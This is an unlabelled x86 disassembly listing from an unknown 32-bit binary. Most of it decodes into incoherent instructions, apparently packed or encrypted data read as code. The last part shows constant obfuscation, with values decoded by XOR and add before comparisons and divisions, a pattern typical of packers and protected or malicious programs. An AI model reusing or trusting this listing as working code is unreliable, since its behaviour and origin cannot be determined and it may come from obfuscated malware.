  405891:	jmp    0x154e:0xa2abfeee
  405898:	xchg   esi,eax
  405899:	xchg   DWORD PTR [ecx+esi*8+0x53],eax
  40589d:	(bad)  
  40589e:	js     0x4058be
  4058a0:	inc    esp
  4058a1:	imul   esi,DWORD PTR [ecx+0x2e744dbb],0x2e
  4058a8:	xor    al,0x8b
  4058aa:	push   ds
  4058ab:	xchg   esi,eax
  4058ac:	and    al,0x36
  4058ae:	cmp    ecx,ebx
  4058b0:	in     eax,0xf5
  4058b2:	fisubr DWORD PTR [edi-0x3cb1a7c6]
  4058b8:	add    BYTE PTR [ebp+0xd],ch
  4058bb:	je     0x4058ed
  4058bd:	add    DWORD PTR [eax+0x41],ebp
  4058c0:	jbe    0x40592b
  4058c2:	mov    eax,ds:0x5ec2f3b3
  4058c7:	test   BYTE PTR [esi+0x46939c8f],ah
  4058cd:	mov    dh,BYTE PTR [ebx-0x61]
  4058d0:	push   ebp
  4058d1:	int3   
  4058d2:	popa   
  4058d3:	mov    ds:0x723d49bf,al
  4058d8:	call   FWORD PTR [eax+edx*4-0x27a9b2eb]
  4058df:	icebp  
  4058e0:	mov    dl,0x59
  4058e2:	push   0xc530f7e1
  4058e7:	dec    eax
  4058e8:	push   cs
  4058e9:	clc    
  4058ea:	fld    QWORD PTR [esi+0x77]
  4058ed:	push   ebp
  4058ee:	jo     0x405882
  4058f0:	call   0x12bf1ec3
  4058f5:	cwde   
  4058f6:	xchg   edx,edi
  4058f8:	in     al,dx
  4058f9:	ret    0x1923
  4058fc:	or     al,0x43
  4058fe:	ja     0x40597a
  405900:	mov    ebx,0x4fd0190a
  405905:	xchg   edi,eax
  405906:	mov    ebx,0xbca4059f
  40590b:	mov    ecx,0x48b7ac36
  405910:	push   ds
  405911:	imul   ecx,DWORD PTR [eax],0x50
  405914:	into   
  405915:	jecxz  0x4058cf
  405917:	out    0xdd,eax
  405919:	xchg   ebp,eax
  40591a:	je     0x4058de
  40591c:	dec    ecx
  40591d:	clc    
  40591e:	pop    esi
  40591f:	inc    edi
  405920:	push   ecx
  405921:	dec    eax
  405922:	sub    BYTE PTR gs:[esi+0x1bb5b8d4],al
  405929:	xor    bl,cl
  40592b:	je     0x405932
  40592d:	xor    bh,BYTE PTR [ebp-0x37]
  405930:	inc    esi
  405931:	fwait
  405932:	push   ds
  405933:	jmp    0xe6f5:0x38819e2e
  40593a:	xchg   ecx,eax
  40593b:	push   ebx
  40593c:	gs xor eax,0x80872730
  405942:	jecxz  0x405933
  405944:	mov    DWORD PTR [ebp-0x168fd414],esp
  40594a:	jmp    0xbb61:0x30ecccc5
  405951:	test   ch,bh
  405953:	fwait
  405954:	loop   0x40597d
  405956:	pop    ebp
  405957:	lahf   
  405958:	jecxz  0x405992
  40595a:	iret   
  40595b:	lock fild DWORD PTR [ebx]
  40595e:	test   al,0xdc
  405960:	xlat   BYTE PTR ds:[ebx]
  405961:	out    0xf1,eax
  405963:	stos   DWORD PTR es:[edi],eax
  405964:	ret    
  405965:	sti    
  405966:	push   ds
  405967:	sbb    BYTE PTR [ebx+edi*4-0xa],al
  40596b:	mov    ah,0x8d
  40596d:	in     eax,dx
  40596e:	hlt    
  40596f:	loope  0x405997
  405971:	test   DWORD PTR [esi],ebx
  405973:	fwait
  405974:	retf   
  405975:	retf   
  405976:	out    dx,al
  405977:	inc    edi
  405978:	xchg   ebp,eax
  405979:	mov    esi,0xc13a6931
  40597e:	es xor eax,0x2aa65399
  405984:	aas    
  405985:	sbb    al,0x3e
  405987:	es nop
  405989:	and    al,0x9a
  40598b:	fadd   DWORD PTR [esi+0x104776f]
  405991:	jge    0x405989
  405993:	bound  edx,QWORD PTR [ecx+0x2babf285]
  405999:	xchg   edx,eax
  40599a:	jg     0x405996
  40599c:	call   0x5f9d9499
  4059a1:	ja     0x405980
  4059a3:	pop    ebp
  4059a4:	mov    bh,cl
  4059a6:	add    ecx,ecx
  4059a8:	push   0xf18bfd0
  4059ad:	dec    esp
  4059ae:	mov    bh,0xeb
  4059b0:	or     cl,ah
  4059b2:	imul   esp,DWORD PTR [ebp-0x78e4e668],0xfa359bdf
  4059bc:	dec    ebp
  4059bd:	in     eax,dx
  4059be:	mov    al,ds:0xde03100c
  4059c3:	(bad)  
  4059c4:	cmp    edx,edi
  4059c6:	adc    BYTE PTR [edx-0x14],ah
  4059c9:	popa   
  4059ca:	xchg   ecx,eax
  4059cb:	fbstp  TBYTE PTR [ebx-0x64]
  4059ce:	push   ss
  4059cf:	xor    BYTE PTR ds:0x7bbb9844,dl
  4059d5:	xchg   BYTE PTR [ecx],bl
  4059d7:	push   ecx
  4059d8:	jle    0x405a4f
  4059da:	xor    DWORD PTR [eax+0x6b28d549],edx
  4059e0:	jp     0x4059ed
  4059e2:	pop    es
  4059e3:	dec    esi
  4059e4:	ins    BYTE PTR es:[edi],dx
  4059e5:	mov    ebx,DWORD PTR [ebx]
  4059e7:	outs   dx,BYTE PTR ds:[esi]
  4059e8:	inc    esp
  4059e9:	idiv   ecx
  4059eb:	inc    esp
  4059ec:	ins    DWORD PTR es:[edi],dx
  4059ed:	repnz ins DWORD PTR es:[edi],dx
  4059ef:	fnstsw WORD PTR [ebx-0x3]
  4059f2:	nop
  4059f3:	arpl   WORD PTR [edx],di
  4059f5:	(bad)  
  4059f6:	jmp    0x4059fa
  4059f8:	inc    esp
  4059f9:	pop    edx
  4059fa:	adc    eax,0x684ec91a
  4059ff:	es mov esp,0xb056b35f
  405a05:	sbb    ch,0xb1
  405a08:	jo     0x4059f0
  405a0a:	daa    
  405a0b:	push   es
  405a0c:	rep outs dx,DWORD PTR ds:[esi]
  405a0e:	cmp    ebp,ecx
  405a10:	in     al,dx
  405a11:	dec    edi
  405a12:	sar    ch,cl
  405a14:	(bad)  
  405a15:	jmp    0x4059b4
  405a17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a18:	mov    eax,ds:0x1fe93727
  405a1d:	mov    ah,0xc9
  405a1f:	stc    
  405a20:	fsub   DWORD PTR [edx-0x69]
  405a23:	repnz test BYTE PTR [ecx-0x3365f49d],0x6f
  405a2b:	jno    0x405a74
  405a2d:	ror    bh,1
  405a2f:	or     al,0x39
  405a31:	jnp    0x405a3a
  405a33:	sbb    al,0x18
  405a35:	retf   0xd60d
  405a38:	pop    es
  405a39:	cmp    DWORD PTR [edi+0x3c432573],ebp
  405a3f:	mov    ecx,DWORD PTR [ebp-0x6c6c040b]
  405a45:	xchg   edx,eax
  405a46:	sub    eax,0x5fefbeb6
  405a4b:	jmp    0x4059f7
  405a4d:	cld    
  405a4e:	sub    BYTE PTR [edx+0x78],bl
  405a51:	dec    ebp
  405a52:	lods   eax,DWORD PTR ds:[esi]
  405a53:	inc    BYTE PTR [ebx+ecx*4+0x4407f86f]
  405a5a:	das    
  405a5b:	xchg   ebx,eax
  405a5c:	fucomip st,st(7)
  405a5e:	pop    es
  405a5f:	(bad)  
  405a60:	fucomi st,st(7)
  405a62:	jo     0x405a06
  405a64:	pusha  
  405a65:	lock sub al,0xf6
  405a68:	data16 mov dl,0x72
  405a6b:	and    DWORD PTR [edx+ecx*2-0x68f06a2],ebp
  405a72:	lods   al,BYTE PTR ds:[esi]
  405a73:	ins    DWORD PTR es:[edi],dx
  405a74:	adc    bh,BYTE PTR [esi-0x2182c77d]
  405a7a:	in     al,0xa6
  405a7c:	add    eax,0x7dc50cc9
  405a81:	xchg   ebx,eax
  405a82:	addr16 mov esi,0xcf88e88e
  405a88:	push   0x328b0b62
  405a8d:	out    dx,al
  405a8e:	dec    eax
  405a8f:	test   BYTE PTR [ebx+0x6e639607],ch
  405a95:	xchg   esp,eax
  405a96:	int3   
  405a97:	stos   DWORD PTR es:[edi],eax
  405a98:	jae    0x405aee
  405a9a:	(bad)  
  405a9b:	mov    ebp,0xa50ca5a1
  405aa0:	add    al,0x1e
  405aa2:	out    0xa4,eax
  405aa4:	adc    eax,0x3b356d7c
  405aa9:	popa   
  405aaa:	push   ecx
  405aab:	pop    esi
  405aac:	popa   
  405aad:	repz dec edi
  405aaf:	push   edx
  405ab0:	pop    edx
  405ab1:	gs pop ebx
  405ab3:	(bad)
  405ab7:	arpl   WORD PTR [ebx+edx*1],bx
  405aba:	push   ebx
  405abb:	lods   eax,DWORD PTR ds:[esi]
  405abc:	mov    esi,0x635e643c
  405ac1:	xlat   BYTE PTR ds:[ebx]
  405ac2:	xor    dl,BYTE PTR [edi-0x9]
  405ac5:	fidiv  WORD PTR [ebx+esi*2-0x35]
  405ac9:	add    al,bh
  405acb:	out    0x47,eax
  405acd:	test   al,0x8b
  405acf:	pop    es
  405ad0:	adc    eax,0x9557f8e3
  405ad5:	mov    al,0xd7
  405ad7:	mov    BYTE PTR [ebx-0x3dcfbee2],ch
  405add:	scas   eax,DWORD PTR es:[edi]
  405ade:	lea    esp,[edx+0x5782b6cb]
  405ae4:	div    ch
  405ae6:	repnz test eax,0x43a70ab0
  405aec:	push   0xffffffb8
  405aee:	push   edx
  405aef:	(bad)  
  405af0:	mov    dl,0xd9
  405af2:	nop
  405af3:	xor    esi,DWORD PTR [esi+0x55]
  405af6:	mov    esi,0xce67ba5c
  405afb:	(bad)  
  405afc:	rol    edx,0x6b
  405aff:	pushf  
  405b00:	or     eax,0xacbfdf8a
  405b05:	(bad)  
  405b06:	out    dx,al
  405b07:	cli    
  405b08:	xlat   BYTE PTR ds:[ebx]
  405b09:	mov    eax,ds:0xd4f10440
  405b0e:	fs cwde 
  405b10:	gs jnp 0x405b30
  405b13:	repnz mov edi,0xfab45f40
  405b19:	xchg   DWORD PTR [edx-0x133a10fe],ebx
  405b1f:	fsub   QWORD PTR [eax-0x8d53ba]
  405b25:	mov    bh,0x7a
  405b27:	ins    BYTE PTR es:[edi],dx
  405b28:	mov    dl,0x6b
  405b2a:	stos   DWORD PTR es:[edi],eax
  405b2b:	lea    ebx,[esi-0x27042332]
  405b31:	(bad)  
  405b34:	adc    ecx,DWORD PTR [edi+0x4d]
  405b37:	inc    ecx
  405b38:	pusha  
  405b39:	xchg   ebx,eax
  405b3a:	shl    DWORD PTR [esi],1
  405b3c:	or     edx,DWORD PTR [esp+edx*4+0xa]
  405b40:	mov    ah,0xde
  405b42:	adc    BYTE PTR [edx*2+0x48341e33],ch
  405b49:	inc    edx
  405b4a:	fadd   QWORD PTR [ebp+0x396de3ba]
  405b50:	hlt    
  405b51:	mov    ?,eax
  405b53:	jge    0x405b82
  405b55:	call   0x727e:0xd60fb348
  405b5c:	push   cs
  405b5d:	fild   WORD PTR ds:0x67604ff5
  405b63:	fstp   QWORD PTR [eax]
  405b65:	sbb    eax,0x920dd019
  405b6a:	out    dx,eax
  405b6b:	sub    al,0x49
  405b6d:	xchg   DWORD PTR [edi],ebp
  405b6f:	xor    ch,BYTE PTR [eax+0x73c6c127]
  405b75:	or     eax,0xf648794f
  405b7a:	aam    0xf7
  405b7c:	dec    esi
  405b7d:	and    ch,BYTE PTR [edi+0x3bf2b358]
  405b83:	push   ecx
  405b84:	loop   0x405b9e
  405b86:	push   es
  405b87:	adc    al,0xe4
  405b89:	and    eax,0xcc9ea331
  405b8e:	outs   dx,DWORD PTR ds:[esi]
  405b8f:	push   ebx
  405b90:	dec    esi
  405b91:	out    dx,al
  405b92:	mov    bl,0x24
  405b94:	mov    esp,0x87c845db
  405b99:	mov    dl,0x95
  405b9b:	into   
  405b9c:	push   0xffffffe3
  405b9e:	xchg   ebx,eax
  405b9f:	repz xor bl,BYTE PTR [ecx+eiz*8-0x40]
  405ba4:	mov    ah,0xe3
  405ba6:	loop   0x405b7a
  405ba8:	or     eax,0xd9b41c51
  405bad:	call   0x1a2f:0xfbcec850
  405bb4:	psubw  mm7,mm1
  405bb7:	dec    edi
  405bb8:	(bad)  
  405bb9:	cmc    
  405bba:	outs   dx,BYTE PTR ds:[esi]
  405bbb:	mov    ch,0xc0
  405bbd:	inc    edx
  405bbe:	xor    bl,bl
  405bc0:	mov    bl,0xb
  405bc2:	adc    BYTE PTR ds:0xa0d136fb,bl
  405bc8:	and    DWORD PTR [ecx+0x79280abb],esp
  405bce:	push   es
  405bcf:	fwait
  405bd0:	stos   BYTE PTR es:[edi],al
  405bd1:	add    ch,BYTE PTR [esi+ecx*4-0x1d]
  405bd5:	loop   0x405bd1
  405bd7:	fist   DWORD PTR [edi+0x47]
  405bda:	mov    cl,0xe2
  405bdc:	les    edi,FWORD PTR [eax-0x42]
  405bdf:	mov    bl,BYTE PTR [ecx-0x5e]
  405be2:	xchg   ebp,eax
  405be3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405be4:	push   edx
  405be6:	push   0x57
  405be8:	(bad)  [ebp-0x29]
  405beb:	xchg   edx,eax
  405bec:	pop    ss
  405bed:	pop    esi
  405bee:	xor    bh,cl
  405bf0:	dec    edi
  405bf1:	pop    esi
  405bf2:	jae    0x405c3f
  405bf4:	fild   WORD PTR [edi]
  405bf6:	lock test al,0xc3
  405bf9:	sar    BYTE PTR [ebp+0x474d189d],cl
  405bff:	or     cl,BYTE PTR [ecx+0x18]
  405c02:	(bad)  
  405c03:	mov    ah,0x47
  405c05:	dec    ecx
  405c06:	xchg   esp,eax
  405c07:	pop    edi
  405c08:	pop    eax
  405c09:	pop    es
  405c0a:	pop    es
  405c0b:	xchg   esp,eax
  405c0c:	cmp    eax,0x66590f2b
  405c11:	repz sbb al,0xeb
  405c14:	lds    ax,DWORD PTR [esi-0x80]
  405c18:	jns    0x405b9e
  405c1a:	int    0xdf
  405c1c:	adc    bl,BYTE PTR ds:0xfa14df44
  405c22:	sbb    ebx,DWORD PTR [eax-0x6dcf1006]
  405c28:	test   BYTE PTR [edx+0x1e],al
  405c2b:	call   0xb588:0xe67daefe
  405c32:	dec    esi
  405c33:	sub    edx,DWORD PTR [ebx-0xdcbad0c]
  405c39:	fs lock mov eax,0xb6c80b68
  405c40:	xchg   ecx,eax
  405c41:	scas   al,BYTE PTR es:[edi]
  405c42:	outs   dx,BYTE PTR ds:[esi]
  405c43:	adc    BYTE PTR [ebx+ebp*2],ch
  405c46:	mov    ch,BYTE PTR [esi]
  405c48:	mov    ah,0xae
  405c4a:	int    0x25
  405c4c:	mov    bl,0xd2
  405c4e:	cmp    al,0xd4
  405c50:	cmp    dl,dh
  405c52:	sbb    DWORD PTR [eax],0x22
  405c55:	fidiv  WORD PTR [ebx]
  405c57:	daa    
  405c58:	and    eax,DWORD PTR [ebx]
  405c5a:	push   ds
  405c5b:	xor    al,0xc6
  405c5d:	jmp    0x3845:0x43b19213
  405c64:	inc    ebp
  405c65:	mov    ch,cl
  405c67:	jmp    0x511:0xe6567453
  405c6e:	lods   al,BYTE PTR ds:[esi]
  405c6f:	pop    ebx
  405c70:	std    
  405c71:	cmp    al,0x88
  405c73:	cli    
  405c74:	fsubr  st,st(0)
  405c76:	xchg   ebp,eax
  405c77:	mov    dl,0x61
  405c79:	(bad)
  405c7d:	and    ch,BYTE PTR [ebx+ecx*4]
  405c80:	add    ebx,DWORD PTR [ebx+0x4730d721]
  405c86:	mov    eax,0x658004cc
  405c8b:	ret    
  405c8c:	dec    ebp
  405c8d:	inc    eax
  405c8e:	iret   
  405c8f:	push   ds
  405c90:	push   eax
  405c91:	sbb    bl,BYTE PTR [ebx+0x622d0129]
  405c97:	pushf  
  405c98:	jno    0x405cbe
  405c9a:	push   es
  405c9b:	mov    ebp,0x1f841e07
  405ca0:	add    DWORD PTR [ebp-0x58],0x451a86e8
  405ca7:	fiadd  DWORD PTR [ebp+ebx*8+0x1f789bc3]
  405cae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405caf:	xor    eax,0x5b746724
  405cb4:	test   eax,0x4a7609af
  405cb9:	and    edi,DWORD PTR [esi-0x63]
  405cbc:	push   ebp
  405cbd:	or     eax,0x1bde2426
  405cc2:	add    al,0x4b
  405cc4:	pop    ss
  405cc5:	inc    edi
  405cc6:	enter  0x735,0xc
  405cca:	push   edi
  405ccb:	sub    ebp,DWORD PTR ds:0x42d4ad3b
  405cd1:	in     al,dx
  405cd2:	mov    edi,0xc3ae5ba2
  405cd7:	jno    0x405ce5
  405cd9:	push   0xffffffbe
  405cdb:	jno    0x405ce3
  405cdd:	outs   dx,DWORD PTR ds:[esi]
  405cde:	sbb    edx,DWORD PTR ds:0xf9504867
  405ce4:	xchg   ecx,eax
  405ce5:	add    BYTE PTR [eax-0x4b],bl
  405ce8:	fdiv   st,st(1)
  405cea:	mov    al,BYTE PTR [eax+0x7550b398]
  405cf0:	mov    esp,0x9e323327
  405cf5:	out    dx,eax
  405cf6:	xchg   BYTE PTR [ebx-0x3f55db48],cl
  405cfc:	xchg   esi,eax
  405cfd:	outs   dx,DWORD PTR ds:[esi]
  405cfe:	jmp    0x405cdf
  405d00:	repz push ebx
  405d02:	xor    DWORD PTR [ebx*8+0x3b0658e3],eax
  405d09:	mov    dl,0xe4
  405d0b:	fimul  DWORD PTR ds:0xad3cd3cc
  405d11:	fbld   TBYTE PTR [edx+0x18648c13]
  405d17:	mov    bl,0x9c
  405d19:	inc    ebp
  405d1a:	push   ds
  405d1b:	bound  ebp,QWORD PTR ds:0xa64d7415
  405d21:	cmp    DWORD PTR [esi+ecx*2+0x1c608728],edx
  405d28:	xchg   BYTE PTR [edi+0x2fd23857],bl
  405d2e:	out    0xd8,al
  405d30:	adc    ebx,edx
  405d32:	aam    0x92
  405d34:	jns    0x405d7d
  405d36:	rcr    BYTE PTR [ecx-0x37],0x57
  405d3a:	mov    al,ds:0x26909ee1
  405d3f:	add    al,0xd6
  405d41:	mov    edx,gs
  405d43:	scas   al,BYTE PTR es:[edi]
  405d44:	fwait
  405d45:	ss push eax
  405d47:	popf   
  405d48:	out    dx,eax
  405d49:	stc    
  405d4a:	xchg   ebx,eax
  405d4b:	lods   eax,DWORD PTR ds:[esi]
  405d4c:	aas    
  405d4d:	cs call edx
  405d50:	shl    BYTE PTR [esi-0x10783a07],0xe7
  405d57:	push   ebp
  405d58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d59:	xchg   edi,eax
  405d5a:	out    0x25,al
  405d5c:	idiv   DWORD PTR [ecx+0x6435fc1c]
  405d62:	jo     0x405da7
  405d64:	jp     0x405d2b
  405d66:	stc    
  405d67:	sti    
  405d68:	xchg   ecx,eax
  405d69:	mov    eax,0x749ed3cd
  405d6e:	and    al,0xef
  405d70:	jbe    0x405d6f
  405d72:	mov    al,ds:0x2ac67bbf
  405d77:	jbe    0x405dee
  405d79:	add    DWORD PTR [edx-0x2781b0b9],esi
  405d7f:	out    dx,eax
  405d80:	ins    DWORD PTR es:[edi],dx
  405d81:	je     0x405d39
  405d83:	push   esi
  405d84:	jg     0x405d56
  405d86:	es push esi
  405d88:	push   es
  405d89:	leave  
  405d8a:	add    BYTE PTR [edx+esi*4-0x7],al
  405d8e:	push   0xc33c8ca3
  405d93:	mov    ch,ah
  405d95:	cmovs  edx,ecx
  405d98:	pop    ss
  405d99:	pop    es
  405d9a:	fs pop ebx
  405d9c:	dec    ebx
  405d9d:	push   edi
  405d9e:	cmc    
  405d9f:	cmc    
  405da0:	and    BYTE PTR [edx+0x29],bh
  405da3:	mov    al,ds:0x4a51c8e5
  405da8:	outs   dx,BYTE PTR ds:[esi]
  405da9:	cmp    al,0xb0
  405dab:	fmul   st,st(5)
  405dad:	xor    BYTE PTR [edi],cl
  405daf:	add    edi,DWORD PTR ds:0xff08e382
  405db5:	cmp    DWORD PTR [edi+ebp*1-0x49],0x4b00b51
  405dbd:	adc    BYTE PTR [esi+0x7d],bh
  405dc0:	push   ebx
  405dc1:	cs jmp 0x405d8b
  405dc4:	popa   
  405dc5:	inc    ecx
  405dc6:	cmp    dh,dh
  405dc8:	mov    al,0xdc
  405dca:	stos   DWORD PTR es:[edi],eax
  405dcb:	jbe    0x405d5a
  405dcd:	imul   BYTE PTR [esi+0x73]
  405dd0:	lds    esi,FWORD PTR [edi+0x61]
  405dd3:	mov    edi,0xd2d501e1
  405dd8:	cmp    DWORD PTR [eax],0xfffffffd
  405ddb:	add    al,0xd3
  405ddd:	aas    
  405dde:	addr16 pop ds
  405de0:	ror    BYTE PTR [ebp-0x42],0x4d
  405de4:	cwde   
  405de5:	adc    BYTE PTR [ecx+0x59],dl
  405de8:	adc    BYTE PTR ds:0x6437ab95,bh
  405dee:	rcl    edx,0x4e
  405df1:	mov    ch,BYTE PTR [ecx+0x5a5afe89]
  405df7:	popa   
  405df8:	(bad)  
  405df9:	les    ebp,FWORD PTR es:[ecx-0x14]
  405dfd:	lock sbb al,0xe4
  405e00:	sbb    eax,0x9e221a02
  405e05:	je     0x405e71
  405e07:	int3   
  405e08:	jmp    0xe9c7d838
  405e0d:	lock int3 
  405e0f:	and    al,0x67
  405e11:	add    BYTE PTR [edi-0x5bfd0c9d],ch
  405e17:	out    0x49,al
  405e19:	pop    esp
  405e1a:	mov    ebp,0xacaeafb9
  405e1f:	fsubr  QWORD PTR [edx-0x15]
  405e22:	push   ss
  405e23:	loopne 0x405db8
  405e25:	cli    
  405e26:	cmp    edx,ebx
  405e28:	fsub   DWORD PTR [ebx]
  405e2a:	xchg   ecx,eax
  405e2b:	or     cl,BYTE PTR [eax]
  405e2d:	test   DWORD PTR [eax+0x7],edi
  405e30:	dec    ecx
  405e31:	sub    ebp,ecx
  405e33:	jno    0x405dfd
  405e35:	sub    DWORD PTR ds:0xa469470b,esp
  405e3b:	add    DWORD PTR [ebx],esp
  405e3d:	push   DWORD PTR [ecx]
  405e3f:	jno    0x405e84
  405e41:	mov    ds:0x45bfee0c,eax
  405e46:	adc    edi,DWORD PTR [ebx+0x1f8d1805]
  405e4c:	cmp    DWORD PTR [edx],ebx
  405e4e:	call   0x54ed6654
  405e53:	call   0x480e:0xd1f58dc7
  405e5a:	adc    dl,BYTE PTR ds:0x5332dd68
  405e60:	imul   esp,DWORD PTR [esi-0x2085f506],0x5093f731
  405e6a:	aaa    
  405e6b:	mov    es,WORD PTR [ecx-0x291aaf3e]
  405e71:	out    0xbd,al
  405e73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e74:	cmp    BYTE PTR [ecx+0x46ea2d30],ch
  405e7a:	and    al,0x55
  405e7c:	ds fwait
  405e7e:	das    
  405e7f:	or     al,0xfc
  405e81:	push   eax
  405e82:	imul   ebx,eax,0x42
  405e85:	inc    esp
  405e86:	adc    BYTE PTR [eax+0x45],bh
  405e89:	pushf  
  405e8a:	call   0x6d7d:0xdfaa3faf
  405e91:	pop    es
  405e92:	jmp    0x7f84a26c
  405e97:	stc    
  405e98:	les    edi,FWORD PTR [eax+edx*4-0x9]
  405e9c:	test   BYTE PTR [edi],bh
  405e9e:	mov    BYTE PTR [esi-0x4c],bl
  405ea1:	jmp    0x405e7a
  405ea3:	mov    ds:0x5ec5e141,al
  405ea8:	mov    esp,0x4c1d4715
  405ead:	mov    eax,DWORD PTR [edi]
  405eaf:	rol    ebx,0x1d
  405eb2:	inc    edx
  405eb3:	mov    ecx,0xd2dbb086
  405eb8:	not    DWORD PTR [ebp+0x41]
  405ebb:	div    DWORD PTR [edi-0x1964c7c6]
  405ec1:	in     al,dx
  405ec2:	test   al,0xbe
  405ec4:	fs inc eax
  405ec6:	rcr    BYTE PTR [esi-0xb],cl
  405ec9:	pushf  
  405eca:	inc    edi
  405ecb:	xor    bl,bh
  405ecd:	icebp  
  405ece:	aad    0xf0
  405ed0:	cmp    al,0xbc
  405ed2:	popf   
  405ed3:	retf   0x680b
  405ed6:	jle    0x405eba
  405ed8:	and    BYTE PTR [edx+edi*2+0x1e],ch
  405edc:	fadd   st(7),st
  405ede:	inc    ebp
  405edf:	mov    ebp,0xf3acb7f2
  405ee4:	mov    DWORD PTR [ecx],ebp
  405ee6:	adc    al,0x22
  405ee8:	push   edx
  405ee9:	jns    0x405eca
  405eeb:	icebp  
  405eec:	xchg   ebp,ecx
  405eee:	xchg   esp,eax
  405eef:	and    al,0xf6
  405ef1:	push   esp
  405ef2:	ja     0x405f0e
  405ef4:	or     ah,ah
  405ef6:	stc    
  405ef7:	add    ecx,ebx
  405ef9:	xor    eax,DWORD PTR [eax]
  405efb:	gs mov edx,0x33c6e66d
  405f01:	xchg   esi,eax
  405f02:	add    DWORD PTR [eax-0x659489d3],0xffffff87
  405f09:	mov    edx,0x17fd2a64
  405f0e:	test   DWORD PTR [edi-0x3d],ecx
  405f11:	push   esp
  405f12:	sbb    dh,bh
  405f14:	dec    ebx
  405f15:	jnp    0x405f44
  405f17:	jmp    0x405ea7
  405f19:	dec    eax
  405f1a:	mov    DWORD PTR [edx+0x6d3ad28e],ebp
  405f20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f21:	call   0x1d2b:0xb17a9c49
  405f28:	(bad)  
  405f29:	sti    
  405f2a:	cmp    al,0x59
  405f2c:	cmp    al,0x64
  405f2e:	addr16 repz call 0x352b339c
  405f35:	leave  
  405f36:	sti    
  405f37:	xor    al,0xb1
  405f39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f3a:	mov    bh,0xb
  405f3c:	cmp    edx,DWORD PTR [edx-0x6028e119]
  405f42:	dec    edx
  405f43:	ins    BYTE PTR es:[edi],dx
  405f44:	scas   al,BYTE PTR es:[edi]
  405f45:	mov    BYTE PTR [ebp-0x742bba77],bh
  405f4b:	inc    ebp
  405f4c:	test   al,0x2b
  405f4e:	ror    DWORD PTR [ecx+0x458be445],0xe4
  405f55:	mov    DWORD PTR [ebp-0x14],eax
  405f58:	mov    eax,DWORD PTR [ebp-0x2c]
  405f5b:	mov    DWORD PTR [ebp-0x38],0xf89c85b5
  405f62:	mov    DWORD PTR [ebp-0x54],eax
  405f65:	mov    DWORD PTR [ebp-0x20],0xf89c85b4
  405f6c:	mov    eax,DWORD PTR [ebp-0x38]
  405f6f:	xor    eax,esi
  405f71:	add    eax,edi
  405f73:	mov    DWORD PTR [ebp-0x10],eax
  405f76:	mov    eax,DWORD PTR [ebp-0x38]
  405f79:	xor    eax,esi
  405f7b:	add    eax,edi
  405f7d:	mov    DWORD PTR [ebp-0x8],eax
  405f80:	mov    DWORD PTR [ebp-0x2c],0xf89c8595
  405f87:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  405f8e:	mov    eax,DWORD PTR [ebp-0x38]
  405f91:	mov    edx,DWORD PTR [ebp-0x14]
  405f94:	xor    eax,esi
  405f96:	add    eax,edi
  405f98:	cmp    edx,eax
  405f9a:	je     0x40852b
  405fa0:	mov    eax,DWORD PTR [ebp-0x20]
  405fa3:	xor    eax,esi
  405fa5:	mov    edx,0xffcd8d06
  405faa:	sub    edx,eax
  405fac:	add    edx,DWORD PTR [ebp-0x14]
  405faf:	mov    eax,DWORD PTR [ebp-0x20]
  405fb2:	mov    ebx,DWORD PTR [ebp-0x10]
  405fb5:	xor    eax,esi
  405fb7:	add    eax,edi
  405fb9:	imul   eax,ebx
  405fbc:	cmp    eax,edx
  405fbe:	ja     0x408528
  405fc4:	mov    edx,DWORD PTR [ebp-0x10]
  405fc7:	mov    eax,DWORD PTR [ebp-0x14]
  405fca:	mov    ebx,DWORD PTR [ebp-0x2c]
  405fcd:	sub    eax,edx
  405fcf:	xor    ebx,esi
  405fd1:	xor    edx,edx
  405fd3:	add    ebx,edi
  405fd5:	div    ebx
  405fd7:	mov    DWORD PTR [ebp-0x8],eax
  405fda:	mov    eax,DWORD PTR [ebp-0x44]
  405fdd:	mov    edx,DWORD PTR [ebp-0x8]
  405fe0:	xor    eax,esi
  405fe2:	add    eax,edi
  405fe4:	cmp    edx,eax
  405fe6:	jbe    0x405ff6
  405fec:	mov    eax,DWORD PTR [ebp-0x44]
  405fef:	xor    eax,esi
  405ff1:	add    eax,edi
  405ff3:	mov    DWORD PTR [ebp-0x8],eax
  405ff6:	mov    eax,DWORD PTR [ebp-0x2c]
  405ff9:	mov    edx,DWORD PTR [ebp-0x8]
  405ffc:	xor    eax,esi
  405ffe:	add    eax,edi
  406000:	imul   eax,edx
  406003:	mov    DWORD PTR [ebp-0x8],eax
  406006:	mov    eax,DWORD PTR [ebp-0x38]
  406009:	mov    edx,DWORD PTR [ebp-0x8]
  40600c:	xor    eax,esi
  40600e:	add    eax,edi
  406010:	cmp    edx,eax
  406012:	je     0x408511
  406018:	mov    eax,DWORD PTR [ebp-0x8]
  40601b:	mov    DWORD PTR [ebp-0x18],eax
  40601e:	mov    eax,DWORD PTR [ebp-0x10]
  406021:	add    eax,DWORD PTR [ebp-0x54]
  406024:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  40602b:	mov    DWORD PTR [ebp-0x8],eax
  40602e:	mov    eax,0xf89c85b4
  406033:	mov    DWORD PTR [ebp-0x28],eax
  406036:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40603d:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  406044:	mov    DWORD PTR [ebp-0x30],eax
  406047:	mov    eax,DWORD PTR [ebp-0x1c]
  40604a:	xor    eax,esi
  40604c:	add    eax,edi
  40604e:	jmp    0x4084cd
  406053:	mov    DWORD PTR [ebp-0x4c],0xf89c85a2
  40605a:	mov    DWORD PTR [ebp-0x50],0xf89c85af
  406061:	mov    eax,DWORD PTR [ebp-0x30]
  406064:	mov    edx,DWORD PTR [ebp-0xc]
  406067:	xor    eax,esi
  406069:	add    eax,edi
  40606b:	imul   eax,edx
  40606e:	mov    edx,DWORD PTR [ebp-0x8]
  406071:	mov    al,BYTE PTR [eax+edx*1]
  406074:	mov    BYTE PTR [ebp-0x1],al
  406077:	mov    eax,DWORD PTR [ebp-0x30]
  40607a:	mov    edx,DWORD PTR [ebp-0xc]
  40607d:	xor    eax,esi
  40607f:	add    eax,edi
